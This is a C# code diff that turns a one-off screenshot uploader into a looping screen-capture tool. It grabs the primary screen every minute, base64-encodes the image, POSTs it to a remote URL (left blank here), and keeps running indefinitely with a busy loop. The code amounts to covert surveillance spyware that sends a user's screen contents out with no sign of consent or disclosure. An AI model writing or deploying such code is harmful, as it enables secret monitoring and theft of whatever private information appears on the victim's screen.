@@ -1,7 +1,12 @@
-﻿using System.Drawing;
+﻿using System;
+using System.Drawing;
 using System.Drawing.Imaging;
+using System.IO;
+using System.Net.Http;
 using System.Runtime.InteropServices;
 using System.Text;
+using System.Threading.Tasks;
+using System.Timers;
 
 
 internal class Program
@@ -10,23 +15,30 @@ internal class Program
     {
 
 #if WINDOWS
+        Timer timer = new();
+        timer.Interval = 1000 * 60;
+        timer.Elapsed += async (a, b) => await Task.Run(async () => 
+        {
+            Rectangle screenBounds = GetPrimaryScreenBounds();
+            using Bitmap screenshot = new(screenBounds.Width, screenBounds.Height);
 
-        Rectangle screenBounds = GetPrimaryScreenBounds();
-        using Bitmap screenshot = new(screenBounds.Width, screenBounds.Height);
+            using var graphics = Graphics.FromImage(screenshot);
+            graphics.CopyFromScreen(screenBounds.Location, Point.Empty, screenBounds.Size);
 
-        using var graphics = Graphics.FromImage(screenshot);
-        graphics.CopyFromScreen(screenBounds.Location, Point.Empty, screenBounds.Size);
+            using var ms = new MemoryStream();
+            screenshot.Save(ms, ImageFormat.Png);
+            byte[] imageBytes = ms.ToArray();
+            var base64Image = Convert.ToBase64String(imageBytes);
 
-        using var ms = new MemoryStream();
-        screenshot.Save(ms, ImageFormat.Png);
-        byte[] imageBytes = ms.ToArray();
-        var base64Image = Convert.ToBase64String(imageBytes);
+            using var client = new HttpClient();
+            byte[] payloadBytes = Encoding.UTF8.GetBytes(base64Image);
+            string url = "";
+            HttpResponseMessage response = await client.PostAsync(url, new ByteArrayContent(payloadBytes));
+            Console.WriteLine($"Response: {response.StatusCode}, {await response.Content.ReadAsStringAsync()}");
+        });
+        timer.Start();
 
-        using var client = new HttpClient();
-        byte[] payloadBytes = Encoding.UTF8.GetBytes(base64Image);
-        string url = "<>";
-        HttpResponseMessage response = client.PostAsync(url, new ByteArrayContent(payloadBytes)).Result;
-        Console.WriteLine($"Response: {response.StatusCode}, {response.Content.ReadAsStringAsync().Result}");
+        while(true);
 #endif
 
     }
